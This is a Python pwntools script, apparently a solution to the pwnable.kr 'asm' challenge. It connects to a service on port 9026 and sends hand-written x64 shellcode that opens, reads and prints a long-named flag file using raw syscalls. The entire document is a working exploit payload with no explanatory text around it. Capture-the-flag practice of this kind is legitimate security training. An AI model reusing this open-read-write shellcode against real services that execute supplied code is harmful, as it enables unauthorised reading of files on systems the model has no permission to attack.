#!/usr/local/bin/env python2
from pwn import *
context.update(arch="amd64", os="linux", bits=64)
p = remote('127.0.0.1', 9026)

shellcode = asm("""
        mov     rax, 2
        mov     rsi, 0
        mov     rdx, 0
        jmp path
jump_back:
        pop rdi
        syscall
    
        mov     rdi, rax
        sub     rsp, 100
        xor     rax, rax
        mov     rsi, rsp
        mov     rdx, 100
        syscall

        mov     rdx, rax
        mov     rax, 1
        mov     rdi, 1
        mov     rsi, rsp 
        syscall

        mov     rax, 60 
        xor     rdi, rdi
        syscall

path:
        call jump_back  
        .ascii "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong";
	.byte 0
""")
p.recvuntil("give me your x64 shellcode: ")
p.send(shellcode)
p.interactive()

